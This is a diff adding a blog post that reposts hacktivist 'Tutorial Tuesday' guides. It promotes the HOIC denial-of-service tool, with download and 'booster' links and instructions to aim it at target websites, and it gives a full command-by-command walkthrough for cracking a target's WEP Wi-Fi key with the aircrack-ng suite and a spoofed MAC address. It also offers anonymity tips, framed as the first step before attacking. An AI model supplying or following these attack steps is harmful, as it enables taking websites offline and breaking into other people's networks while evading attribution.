@@ -1,0 +1,150 @@
+---
+layout: post
+title: 'Noted: Pastebin Tuts - DoS Attacks, WEP Cracking, Anonymous Surfing'
+date: '2012-06-22T22:48:00.014+01:00'
+author: insmodscum
+tags:
+- Insurgency Mod Scum
+- OT-OPSEC / Anonymity
+- OT-Noted
+- OT-Pastebin
+- OT-Tools
+modified_time: '2013-05-02T21:10:10.734+01:00'
+blogger_id: tag:blogger.com,1999:blog-7256856399250838035.post-7473039295169682117
+blogger_orig_url: http://insurgencymod.blogspot.com/2012/06/dos-attack-wep-cracking-anonymous.html
+---
+
+<a href="http://pastebin.com/2yk7wdYi">http://pastebin.com/2yk7wdYi</a><br />
+<a name='more'></a><br />
+<blockquote>
+Every old Tutorial Tuesday up to the last one all in one paste... enjoi. 3, Adistakos and AntiS3curityOPS.<br />
+<br />
+Tutorial Tuesday (Published Feb. 13th): The basics on offense techniques for today. Brought to you by your teach3rs at AntiS3curityOPS.<br />
+Now shhhh down, and let the class begin.<br />
+<br />
+This week we are gonna do a rundown on the basics of attacking a target in the most simple manner.<br />
+<br />
+Today we're gonna talk about HOIC (High Orbit Ion Cannon) which you can download the torrent here: http://thepiratebay.se/torrent/7021431/High_Orbit_Ion_Cannon<br />
+<br />
+So what is HOIC?<br />
+HOIC overloads a server with fake visitors a simulated flood of malicious traffic that pushes a site to its breaking point. And once a website is down, this software keeps it down.<br />
+<br />
+HOIC is also user friendly:<br />
+Anybody could use the HOIC. All you need to do is type in a target website and click fire.<br />
+<br />
+The HOIC has some diabolical tricks up its sleeve. First, it cranks out more dummy traffic meant to overwhelm and crash a server with more fake "visitors" than it can handle, with a magnitude that outstrips anything the LOIC was capable of: It's able to fire off as much as 2 MB per second (depending on your connection and proxy/tor configuration) using HOIC. Part of the supercharging comes from the use of "boosters" (which you can find here:http://pastebin.com/a0vZwNum) custom scripts that spread malicious traffic across a range of target sub-pages, rather than just one. For example: instead of hitting EvilSite.com, a booster will knock EvilSite.com/about.html, EvilSite.com/news.html, etc, all forged to look like the traffic is coming from a variety of spots. Think shotgun versus pistol.<br />
+<br />
+We are AntiS3curityOPS.<br />
+We are legion.<br />
+We do not forgive.<br />
+We do not forget.<br />
+Expect us.</blockquote>
+<hr style="-webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px;" />
+<blockquote>
+(Published Feb 23rd)     Tutorial Tuesday: Today we go in DEEP, we are gonna talk about wifi WEP cracking, pay close attention because this one is a bit complicated, you may google a bit so keep in mind that. Brought to you by your teach3rs at AntiS3curityOPS.<br />
+Now shhhh down, and let the class begin!<br />
+<br />
+This tut will explaon how to crack 64bit and 128bit WEP on many WIFI access points and routers using Backtrack 3 (which I use)<br />
+, a live linux distribution. Your mileage may very. The basic theory is that we want to connect to an Access Point using WEP Encryption, but we do not know the key. We will attack the wifi router, making it generate packets for our cracking effort, finally cracking the WEP key. I have tested this technique on a Lenvo n100 3000 and the WIFI Chipset in this machines work for sure.<br />
+<br />
+Make sure you download Backtrack 3 (and burn the ISO directly to a cd/dvd)<br />
+Make sure your wifi card is compatible and make sure you take your steps different due to different hardware configurations.<br />
+<br />
+So lets start:<br />
+<br />
+Preparing The WIFI Card:<br />
+First we must enable “Monitor Mode” on the wifi card. If using the Intel PRO/Wireless 3945ABG chipset issue the following commands:<br />
+<br />
+modprobe -r iwl3945<br />
+<br />
+modprobe ipwraw<br />
+<br />
+The above commands will enable monitor mode on the wireless chipset in your computer. Next we must stop your WIFI card:<br />
+iwconfig<br />
+<br />
+Take note of your wireless adapter’s interface name. Then stop the adapter by issuing:<br />
+airmon-ng stop [device]<br />
+<br />
+Then:<br />
+<br />
+ifconfig [interface] down<br />
+<br />
+Now we must change the MAC address of the adapter:<br />
+<br />
+macchanger --mac 00:11:22:33:44:66 [device]<br />
+<br />
+Its now time to start the card in monitor mode by doing:<br />
+<br />
+airmon-ng start [device]<br />
+<br />
+We are now ready… So lets go to the next step:<br />
+<br />
+Attacking The Target:<br />
+It is now time to locate a suitable WEP enabled network to work with:<br />
+<br />
+airodump-ng [device]<br />
+<br />
+Be sure to note the MAC address (BSSID), channel (CH) and name (ESSID) of the target network. Now we must start collecting data from the WIFI access point for the attack:<br />
+<br />
+airodump-ng -c [channel] -w [network.out] --bssid [bssid] [device]<br />
+<br />
+The above command will output data collected to the file: network.out. This file will be fed into the WEP Crack program when we are ready to crack the WEP key.<br />
+Open another shell and leave the previous command running. Now we need to generate some fake packets to the access point to speed up the data output. Test the access point by issuing the following command:<br />
+<br />
+aireplay-ng -1 0 -a [bssid] -h 00:11:22:33:44:66 -e [essid] [device]<br />
+<br />
+If this command is successful we will now generate many packets on the target network so that we can crack the KEY. Type:<br />
+<br />
+airplay-ng -3 -b [bssid] -h 00:11:22:33:44:66 [device]<br />
+<br />
+This will force the access point to send out a bunch of packets which we can then use to crack the WEP key. Check your aerodump-ng shell and you should see the “data” section filling up with packets.<br />
+<br />
+After about 40,000-75,000 you can begin cracking the WEP key. If there are no other hosts on the target access point generating packets, you can try:<br />
+<br />
+aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b [bssid] -h 00:11:22:33:44:66 [device]<br />
+<br />
+Once you have enough packets, you begin the crack:<br />
+<br />
+aircrack-ng -n 128 -b [bssid] [filename]-01.cap<br />
+<br />
+The “-n 128″ signifies a 128-bit WEP key. If cracking fails, try a 64-bit key by changing the value of N to 64.<br />
+Once the crack is successful you will be left with the KEY! Remove the : from the output and there is your key. So there you have it.<br />
+You can use these techniques to demonstrate to others why using WEP is a bad idea. I suggest you use WPA2 encryption on your wireless networks. Goodluck!</blockquote>
+<hr style="-webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px;" />
+<blockquote>
+(Published May 29th)     Adistakos of AntiS3curityOPS Proudly presents the return of Tutorial Tuesday...<br />
+<br />
+This week marks the epic return of Tutorial Tuesday's... back by popular demand. We are gonna give you the rundown about how to be Anonymous while surfing online (anyone not a noob saying "thats it"", bear with us, we are teaching the masses and must assume no knowledge is known). And at the end is a break down of the HOIC (High Orbit Ion Cannon), a basic tool in attacking which should be first step after Anonymizing yourself. We started basic, we are trying to educate the masses. Stay tuned every week for a weekly installation of this... here we go.<br />
+<br />
+IP Address: An identifier for a computer or device on a TCP/IP network. Networks using the TCP/IP protocol route messages based on the IP address of the destination. The format of an IP address is a 32-bit numeric address written as four numbers separated by periods. Each number can be zero to 255. For example, 1.160.10.240 could be an IP address.<br />
+<br />
+So in basic terms, it means your computer has an address. A way of routing what goes where, a sort of organizational tool for the mass chaos that is the internet. Now, the obvious thing here is how to hide your IP, and make it so your one in a billion of Anonymous users.<br />
+<br />
+Tor network: Tor is free software and an open network that helps you defend against a form of network surveillance that threatens personal freedom and privacy, confidential business activities and relationships, and state security known as traffic analysis. It is used by millions and a beloved thing to many.<br />
+<br />
+Tor Download: https://www.torproject.org/download/download-easy.html.en<br />
+<br />
+VPN: A virtual private network that interconnects remote (and often geographically separate) networks through primarily public communication infrastructures such as the Internet. VPNs provide security through tunneling protocols and security procedures such as encryption. For example, a VPN could be used to securely connect the branch offices of an organization to a head office network through the public Internet.<br />
+<br />
+Good VPN Download: http://openvpn.net/index.php/download.html (Compatible with Windows, MAC, and Linux OS environments)<br />
+<br />
+Another decent VPN: http://www.cites.illinois.edu/vpn/download-install.html<br />
+<br />
+Another way to hide your IP if your lazy is websites that do the proxy work for you. It allows you to connect to a wide array of IP's and is only valid as long as your online. Good for all you 14 year olds not wanting your parents to realize your computer literate.<br />
+<br />
+Now between these helpful tips, as well as maybe some investigation on your own, you will find what works best for you with your operating system as well as personal preference...<br />
+<br />
+Now we're gonna talk about HOIC (High Orbit Ion Cannon) which you can download the torrent here: http://thepiratebay.se/torrent/7021431/High_Orbit_Ion_Cannon<br />
+<br />
+So what is HOIC?<br />
+HOIC overloads a server with fake visitors a simulated flood of malicious traffic that pushes a site to its breaking point. And once a website is down, this software keeps it down.<br />
+<br />
+HOIC is also user friendly:<br />
+Anybody could use the HOIC. All you need to do is type in a target website and click fire.<br />
+<br />
+The HOIC has some diabolical tricks up its sleeve. First, it cranks out more dummy traffic meant to overwhelm and crash a server with more fake "visitors" than it can handle, with a magnitude that outstrips anything the LOIC was capable of: It's able to fire off as much as 2 MB per second (depending on your connection and proxy/tor configuration) using HOIC. Part of the supercharging comes from the use of "boosters" (which you can find here:http://pastebin.com/a0vZwNum) custom scripts that spread malicious traffic across a range of target sub-pages, rather than just one. For example: instead of hitting EvilSite.com, a booster will knock EvilSite.com/about.html, EvilSite.com/news.html, etc, all forged to look like the traffic is coming from a variety of spots. Think shotgun versus pistol.</blockquote>
+<hr style="-webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px;" />
+ 
+<br> 
+<br> 
+IMSIDAED62405543FD96BB90A3830A47419036BBAB3BE 
